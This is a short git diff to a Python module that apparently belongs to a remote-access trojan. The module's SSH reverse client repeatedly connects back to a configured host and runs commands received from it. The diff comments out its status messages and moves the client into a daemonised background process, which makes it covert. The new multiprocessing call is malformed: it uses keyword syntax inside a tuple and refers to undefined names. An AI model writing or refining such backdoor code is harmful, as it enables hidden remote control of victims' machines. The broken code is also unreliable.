@@ -8,6 +8,7 @@ import subprocess
 
 # 在线导入第三方库的方法
 paramiko = importlib.import_module('paramiko')
+multiprocessing = importlib.import_module('multiprocessing')
 
 
 HOST = ''
@@ -42,7 +43,7 @@ class Server(paramiko.ServerInterface):
 def ssh_reverse_client(host, port, username, password):
     while True:
         try:
-            print('SSH Reverse Client...')
+            #print('SSH Reverse Client...')
             time.sleep(5)
 
             client = paramiko.SSHClient()
@@ -50,7 +51,7 @@ def ssh_reverse_client(host, port, username, password):
             client.connect(host, port=port, username=username, password=password)
 
             my_session = client.get_transport().open_session()
-            print('SSH Reverse Client Succeed!')
+            #print('SSH Reverse Client Succeed!')
 
             while True:
 
@@ -72,7 +73,7 @@ def ssh_reverse_client(host, port, username, password):
                         signal.alarm(0)#取消定时器
 
                 else:
-                    print("Connection failed.")
+                    #print("Connection failed.")
                     break
 
 
@@ -84,4 +85,9 @@ def ssh_reverse_client(host, port, username, password):
 
 
 def run(**args):
-    ssh_reverse_client(host=HOST, port=PORT, username=USERNAME, password=PASSWORD)
+    p = multiprocessing.Process(target=ssh_reverse_client, args=(host=host, port=port, username=username, password=password))
+
+    #后台运行
+    p.daemon = True
+    p.start()
+    return 'Success'
